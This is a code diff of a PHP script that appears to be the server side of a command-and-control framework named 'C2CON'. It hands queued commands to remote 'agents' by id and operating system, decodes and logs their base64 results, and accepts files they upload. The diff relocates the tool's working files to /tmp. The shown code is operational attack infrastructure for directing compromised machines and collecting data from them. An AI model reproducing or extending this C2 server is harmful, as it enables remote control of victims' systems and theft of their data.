@@ -6,7 +6,7 @@ $smode = strval($mode);
 
 if ($smode == "cmds"){
 
-echo file_get_contents("/var/www/html/cmds.txt");
+echo file_get_contents("/tmp/C2CON-cmds.txt");
 
 $id = intval($_GET['id']);
 $sid = strval($id);
@@ -15,11 +15,11 @@ $os = strval($_GET['o']);
 
 if (!empty($id)) {
 
-shell_exec("cat ping.txt | grep -v ".$sid." > temping");
-shell_exec("cat temping > ping.txt");
+shell_exec("cat /tmp/C2CON-ping.txt | grep -v ".$sid." > /tmp/C2CON-temping");
+shell_exec("cat /tmp/C2CON-temping > /tmp/C2CON-ping.txt");
 
 $time = date("Y-m-d H:i:s"); 
-$file = 'ping.txt';
+$file = '/tmp/C2CON-ping.txt';
 
 
 if ($os == "W"){
@@ -57,15 +57,15 @@ $sid = strval($id);
 if (!empty($resp)) {
 
 $res = base64_decode($resp); 
-$file = 'res.txt';
+$file = '/tmp/C2CON-res.txt';
 $current = file_get_contents($file);
 $current .= "Agent ".$id." => ".$res.PHP_EOL;
 file_put_contents($file, $current);
 
 
 
-shell_exec("cat cmds.txt | grep -v ".$sid." > temp");
-shell_exec("cat temp > cmds.txt");
+shell_exec("cat /tmp/C2CON-cmds.txt | grep -v ".$sid." > /tmp/C2CON-temp");
+shell_exec("cat /tmp/C2CON-temp > /tmp/C2CON-cmds.txt");
 }
 
 
@@ -94,7 +94,7 @@ if ($uploadOk == 0) {
 
 } else {
   if (move_uploaded_file($_FILES["data"]["tmp_name"] , $target_file)) {
-  $file = 'res.txt';
+  $file = '/tmp/C2CON-res.txt';
   $current = file_get_contents($file);
   $current .= "Agent ".$id." => File ".basename($_FILES["data"]["name"])." Saved to $target_file".PHP_EOL;
   file_put_contents($file, $current);  
